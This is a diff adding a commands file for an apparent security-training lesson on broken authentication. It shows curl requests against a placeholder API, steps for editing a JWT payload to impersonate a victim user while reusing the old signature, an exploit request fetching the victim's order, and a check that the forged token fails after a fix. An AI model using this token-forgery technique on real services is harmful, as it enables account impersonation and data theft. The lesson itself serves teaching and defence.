@@ -1,0 +1,52 @@
+
+---
+
+# 📄 `lesson-02-broken-authentication/commands.txt`
+
+```text id="l2cmds"
+# =========================
+# Normal Request (Attacker)
+# =========================
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: Bearer <TOKEN_B>" \
+--data-raw '{"action":"orders"}' | jq
+
+
+# =========================
+# Decode JWT (locally)
+# =========================
+# Split token into header.payload.signature
+# Decode payload (base64)
+
+
+# =========================
+# Modify Payload (Impersonate Victim)
+# =========================
+# Change:
+# "username": "<VICTIM_USER>"
+# "sub": "<VICTIM_USER>"
+
+
+# =========================
+# Rebuild Token
+# =========================
+# forged_token = header.modified_payload.signature
+
+
+# =========================
+# Exploit Request
+# =========================
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: Bearer <FORGED_TOKEN>" \
+--data-raw '{"action":"get","order-id":"<ORDER_ID>"}' | jq
+
+
+# =========================
+# After Fix (Should Fail)
+# =========================
+curl -s "$API" \
+-H "content-type: application/json" \
+-H "authorization: Bearer <FORGED_TOKEN>" \
+--data-raw '{"action":"get","order-id":"<ORDER_ID>"}' | jq
